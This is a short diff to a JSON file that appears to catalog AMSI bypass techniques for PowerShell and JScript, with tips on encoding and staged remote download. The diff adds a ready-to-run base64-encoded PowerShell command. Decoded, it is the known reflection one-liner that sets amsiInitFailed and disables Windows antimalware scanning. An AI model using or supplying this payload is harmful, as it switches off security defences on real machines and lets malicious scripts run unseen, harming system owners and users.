@@ -138,7 +138,8 @@
         "Base64 corruption from copy/paste - Use file transfer",
         "Character encoding mismatch - Must be UTF-16LE for PowerShell",
         "Command line too long - Use staged approach with remote download"
-      ]
+      ],
+      "filled_example": "powershell -EncodedCommand W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp"
     },
     {
       "id": "amsi-jscript-registry",
